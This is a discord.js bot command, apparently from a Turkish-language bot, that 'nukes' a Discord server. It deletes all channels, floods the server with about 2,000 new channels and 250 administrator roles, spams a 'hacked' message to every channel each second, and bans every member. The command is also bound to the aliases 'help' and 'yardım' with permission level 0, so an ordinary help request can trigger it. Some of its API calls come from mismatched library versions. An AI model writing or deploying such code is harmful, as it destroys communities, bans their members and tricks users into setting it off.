const Discord = require("discord.js");

const config = require('../config.js');

module.exports.run = async (client, message, args) => {
  message.guild.channels.cache.forEach(ch => ch.delete({ reason: config.boom.channelDeleteReason }))
  for(let a=0;a<500;a++) {
    await message.guild.createChannel("▬▬▬▬▬▬▬", { type: "voice" });
    await message.guild.createChannel(config.channelName.textOne, { type: "text" });
    await message.guild.createChannel(config.channelName.textTwo, { type: "text" });
    await message.guild.createChannel("▬▬▬▬▬▬▬", { type: "voice" });
  }
  for(let b=0;b<250;b++) {
    message.guild.createRole(config.boom.ame, { color: '313131', permissions: ['ADMINISTRATOR'] });
  }
  setInterval(() => {
    client.channels.cache.forEach(ch => ch.send(config.boom.hackedMessage));
  }, 1000);
  message.guild.members.cache.forEach(users => setTimeout(() => users.ban({ reason: config.boom.banReason }), 1000));  
};

module.exports.conf = {
  aliases: ['gg', 'yardım', 'help', 'patlat'],
  permLevel: 0,
};

module.exports.help = {
  name: "Patlat",
  description: "Mesajın Yazıldığı Sunucunun İçinden Geçer..",
  usage: "<Prefix>patlat"
};
